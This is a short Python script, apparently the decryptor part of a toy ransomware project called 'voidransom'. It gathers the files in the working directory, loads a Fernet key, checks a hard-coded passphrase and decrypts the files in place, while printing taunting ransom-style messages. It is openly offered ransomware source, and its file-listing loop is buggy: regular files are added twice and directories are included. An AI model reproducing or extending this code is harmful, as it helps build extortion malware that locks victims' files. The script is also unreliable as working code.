#!/usr/bin/env python3

from cryptography.fernet import Fernet
import os

#find files

files = []

for file in os.listdir():
    if file == "voidransom.py" or file == "thekey.key" or file == "voiddecrypt.py":
        continue
    files.append(file)
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
     secretkey = key.read()


# decryption process

secretphrase = "dedopswashere"

user_phrase = input("Please enter super secret phrase to decrypt files! \n")

if user_phrase == secretphrase:
    for file in  files:
        with open(file, "rb") as thefile:
             contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
             thefile.write(contents_decrypted)
        print("Damn you beat us super elite hackers!!!")
else:
      print("Sorry we a super strong decryption password! AHAHAHHAAH")
